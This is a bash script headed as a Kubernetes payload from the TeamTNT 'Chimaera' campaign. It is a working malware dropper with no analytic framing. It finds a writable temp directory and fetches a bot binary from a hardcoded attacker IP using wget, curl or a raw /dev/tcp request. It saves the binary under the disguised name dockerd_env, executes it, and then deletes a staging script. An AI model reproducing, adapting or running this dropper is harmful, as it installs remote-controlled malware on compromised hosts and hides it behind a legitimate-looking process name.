#!/bin/bash
#
#	TITLE:		Chimaera_Kubernetes_temp_PayLoad_1
#	AUTOR:		hilde@teamtnt.red
#	VERSION:	Chimaera_stable_V1.00.1
#	DATE:		12.08.2021
#
#	SRC:        http://chimaera.cc/cmd/Kubernetes_temp_PayLoad_1.sh
#
########################################################################

BOT_BIN_URL="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../TNTb/$(uname -m)"


function C_hg_DLOAD() {
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  while IFS= read -r line ; do 
      [[ "$line" == $'\r' ]] && break
  done <&3
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do 
      printf "%s$nul" "$x"
  done <&3
  exec 3>&-
}

function C_hg_DLOAD_BASH(){
C_hg_T_PATH=$1
	if [ -z "$C_hg_T_PATH" ]; then 
	C_hg_DLOAD $BOT_BIN_URL > dockerd_env
	chmod +x dockerd_env
	chmod +x ./dockerd_env
	./dockerd_env
		else
		C_hg_DLOAD $BOT_BIN_URL > $C_hg_T_PATH/dockerd_env
		chmod +x $C_hg_T_PATH/dockerd_env
		$C_hg_T_PATH/dockerd_env
		fi
}

function C_hg_DLOAD_CURL(){
C_hg_T_PATH=$1
	if [ -z "$C_hg_T_PATH" ]; then 
	curl $BOT_BIN_URL -o dockerd_env
	chmod +x dockerd_env
	chmod +x ./dockerd_env
	./dockerd_env
		else
		curl $BOT_BIN_URL -o $C_hg_T_PATH/dockerd_env
		chmod +x $C_hg_T_PATH/dockerd_env
		$C_hg_T_PATH/dockerd_env
		fi
}

function C_hg_DLOAD_WGET(){
C_hg_T_PATH=$1
	if [ -z "$C_hg_T_PATH" ]; then 
	wget $BOT_BIN_URL -O dockerd_env
	chmod +x dockerd_env
	chmod +x ./dockerd_env
	./dockerd_env
		else
		wget $BOT_BIN_URL -O $C_hg_T_PATH/dockerd_env
		chmod +x $C_hg_T_PATH/dockerd_env
		$C_hg_T_PATH/dockerd_env
		fi
}


if [ -z "$C_hg_TMP_PATH" ]; then touch /var/tmp/K.t.1 2>/dev/null
if [ -f "/var/tmp/K.t.1" ]; then rm -f /var/tmp/K.t.1 2>/dev/null 1>/dev/null
C_hg_TMP_PATH="/var/tmp"
fi ; fi
	if [ -z "$C_hg_TMP_PATH" ]; then touch /tmp/K.t.1 2>/dev/null
	if [ -f "/tmp/K.t.1" ]; then rm -f /tmp/K.t.1 2>/dev/null 1>/dev/null
	C_hg_TMP_PATH="/tmp"
	fi ; fi
		if [ -z "$C_hg_TMP_PATH" ]; then touch /dev/shm/K.t.1 2>/dev/null
		if [ -f "/dev/shm/K.t.1" ]; then rm -f /dev/shm/K.t.1 2>/dev/null 1>/dev/null
		C_hg_TMP_PATH="/dev/shm"
		fi ; fi

  if type wget 2>/dev/null 1>/dev/null; then C_hg_DLOAD_WGET $C_hg_TMP_PATH
elif type curl 2>/dev/null 1>/dev/null; then C_hg_DLOAD_CURL $C_hg_TMP_PATH
elif type bash 2>/dev/null 1>/dev/null; then C_hg_DLOAD_BASH $C_hg_TMP_PATH
fi

rm -f k31t.sh 2>/dev/null
